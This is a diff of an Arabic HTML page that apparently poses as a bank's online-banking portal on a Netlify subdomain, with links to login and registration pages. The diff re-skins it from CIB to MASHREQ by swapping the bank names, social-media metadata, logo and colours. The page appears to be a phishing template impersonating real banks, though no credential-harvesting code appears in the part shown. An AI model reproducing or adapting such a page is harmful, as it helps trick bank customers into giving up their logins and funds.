@@ -4,23 +4,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="الخدمات المصرفية الإلكترونية من بنك CIB.">
-    <meta property="og:url" content="https://eg-cib.netlify.app/">
+    <meta name="description" content="الخدمات المصرفية الإلكترونية من بنك MASHREQ.">
+    <meta property="og:url" content="https://eg-MASHREQ.netlify.app/">
     <meta property="og:type" content="website">
-    <meta property="og:title" content="بنك CIB">
-    <meta property="og:description" content="الخدمات المصرفية الإلكترونية من بنك CIB.">
-    <meta property="og:image" content="https://eg-cib.netlify.app/assets/wajha.png">
+    <meta property="og:title" content="بنك MASHREQ">
+    <meta property="og:description" content="الخدمات المصرفية الإلكترونية من بنك MASHREQ.">
+    <meta property="og:image" content="https://eg-MASHREQ.netlify.app/assets/wajha.png">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
     <meta name="twitter:card" content="summary_large_image">
-    <meta property="twitter:domain" content="eg-cib.netlify.app">
-    <meta property="twitter:url" content="https://eg-cib.netlify.app/">
-    <meta name="twitter:title" content="بنك CIB">
-    <meta name="twitter:description" content="الخدمات المصرفية الإلكترونية من بنك CIB.">
-    <meta name="twitter:image" content="https://eg-cib.netlify.app/assets/wajha.png">
+    <meta property="twitter:domain" content="eg-MASHREQ.netlify.app">
+    <meta property="twitter:url" content="https://eg-MASHREQ.netlify.app/">
+    <meta name="twitter:title" content="بنك MASHREQ">
+    <meta name="twitter:description" content="الخدمات المصرفية الإلكترونية من بنك MASHREQ.">
+    <meta name="twitter:image" content="https://eg-MASHREQ.netlify.app/assets/wajha.png">
     <link rel="prefetch" href="registration.php">
     <link rel="prefetch" href="login.php">
-    <title>بنك CIB</title>
+    <title>بنك MASHREQ</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -29,7 +29,7 @@
             font-family: 'Cairo', sans-serif;
             min-height: 100vh;
             background: #f0f4f8;
-            color: #1a2332;
+            color: #f57c00;
             direction: rtl;
             display: flex;
             justify-content: center;
@@ -99,7 +99,7 @@
         .section-title {
             font-size: 17px;
             font-weight: 700;
-            color: #1a2332;
+            color: #f57c00;
             padding: 20px 24px 12px;
         }
 
@@ -174,7 +174,7 @@
         .card-name {
             font-size: 15px;
             font-weight: 700;
-            color: #1a2332;
+            color: #f57c00;
             margin-bottom: 4px;
         }
 
@@ -221,7 +221,7 @@
         .watch-title {
             font-size: 17px;
             font-weight: 700;
-            color: #1a2332;
+            color: #f57c00;
             text-align: center;
             margin-bottom: 16px;
             padding-top: 4px;
@@ -398,13 +398,13 @@
     <div class="page-wrapper">
         <!-- Header -->
         <div class="header">
-            <img src="assets/logo.webp" alt="CIB" class="header-logo" decoding="async">
+            <img src="assets/mashreq.jpeg" alt="MASHREQ" class="header-logo" decoding="async">
             <div class="header-welcome">الخدمات المصرفية الإلكترونية</div>
         </div>
 
         <!-- Banner -->
         <div class="banner-section">
-            <img src="assets/wajha.webp" alt="CIB" class="banner-img" fetchpriority="high" decoding="async">
+            <img src="assets/wajha.webp" alt="MASHREQ" class="banner-img" fetchpriority="high" decoding="async">
         </div>
 
         <!-- Main Content -->
@@ -511,7 +511,7 @@
             </div>
             <div class="nav-item">
                 <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.7"><polyline points="20 12 20 22 4 22 4 12"/><rect x="2" y="7" width="20" height="5" rx="1"/><line x1="12" y1="22" x2="12" y2="7"/></svg>
-                <span>مكافأة CIB</span>
+                <span>مكافأة MASHREQ</span>
             </div>
             <div class="nav-item">
                 <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.8"><line x1="3" y1="8" x2="21" y2="8"/><polyline points="17,4 21,8 17,12"/><line x1="21" y1="16" x2="3" y2="16"/><polyline points="7,12 3,16 7,20"/></svg>
